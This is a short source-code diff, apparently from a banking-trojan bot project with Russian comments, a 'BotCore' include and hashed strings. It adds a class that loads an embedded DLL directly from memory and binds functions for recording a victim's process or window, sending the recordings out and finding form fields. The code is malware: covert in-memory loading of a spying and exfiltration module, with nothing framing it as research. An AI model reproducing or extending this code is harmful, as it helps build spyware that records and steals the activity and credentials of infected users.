@@ -1,7 +1,6 @@
 
 
 #include "VideoRecorder.h"
-#include "DllLoader.h"
 #include "BotCore.h"
 #include "Memory.h"
 #include "Utils.h"
@@ -53,7 +52,6 @@ namespace VIDEORECDEBUGSTRINGS
 #define HASH_VIDEO_REC_HOST 0x922E6EAC /* VIDEO_REC_HOST */
 
 
-
 namespace VideoRecorder
 {
 	// Подключаем код библиотеки
@@ -68,6 +66,48 @@ namespace VideoRecorder
 	HMEMORYMODULE inline LoadDLL();
 
 }
+
+
+//*****************************************************************************
+//                                    TVideoRecDLL
+//*****************************************************************************
+TVideoRecDLL::TVideoRecDLL()
+{
+	// Загружаем библиотеку и инициализируем апи
+	FHandle = MemoryLoadLibrary(VideoRecorder::data);
+	InitializeApi();
+}
+//-------------------------------------------------------------------
+
+TVideoRecDLL::~TVideoRecDLL()
+{
+	if (FHandle)
+		MemoryFreeLibrary(FHandle);
+
+}
+//-------------------------------------------------------------------
+
+void TVideoRecDLL::LoadFunc(LPVOID *Addr, const char* Name)
+{
+	// Функция загружает функцию библиотеки
+	if (FHandle)
+		*Addr = MemoryGetProcAddress(FHandle, Name);
+	else
+		*Addr = NULL;
+
+}
+
+void TVideoRecDLL::InitializeApi()
+{
+	LoadFunc((LPVOID*)&FRecordProcess,   "StartRecPid");
+	LoadFunc((LPVOID*)&FRecordWnd,       "StartRecHwnd");
+	LoadFunc((LPVOID*)&FStop,            "StopRec");
+	LoadFunc((LPVOID*)&FResetTimer,      "ResetTimer");
+	LoadFunc((LPVOID*)&FSendData,        "StartSend");
+	LoadFunc((LPVOID*)&FStartFindFields, "StartFindFields");
+    LoadFunc((LPVOID*)&FStopFindFields,  "StopFindFields");
+}
+
 
 //*****************************************************************************
 
